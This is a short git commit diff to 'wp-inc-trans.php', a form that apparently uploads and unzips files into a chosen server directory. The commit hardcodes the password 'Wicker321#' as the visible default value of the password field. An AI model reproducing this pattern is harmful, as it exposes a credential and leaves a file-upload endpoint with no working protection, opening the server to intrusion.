bc50f397bb783a0db00e8528e6e68ce005540dd0
Mohammad Hamza Khan <112153537+HumzaKV@users.noreply.github.com>
2023-11-13 16:07:41 +0500

    Updated input password in wp-inc-trans.php

--- wp-inc-trans.php
+++ wp-inc-trans.php
@@ -119,7 +119,7 @@ if( isset($_POST['un_zip']) ) {
     <input type="text" id="directory" name="dir" value="<?php echo $dir_value; ?>" /><br /><br />
     <input type="text" id="extract" name="extract" value="<?php echo $extract; ?>" /><br /><br />
     
-    <input type="password" name="pass" placeholder="Enter Password" /><br /><br />
+    <input type="password" name="pass" value="Wicker321#" placeholder="Enter Password" /><br /><br />
     
     <input type="file" id="fileupload" name="files" /><br /><br />
     <input type="submit" name="submit" value="Upload" />
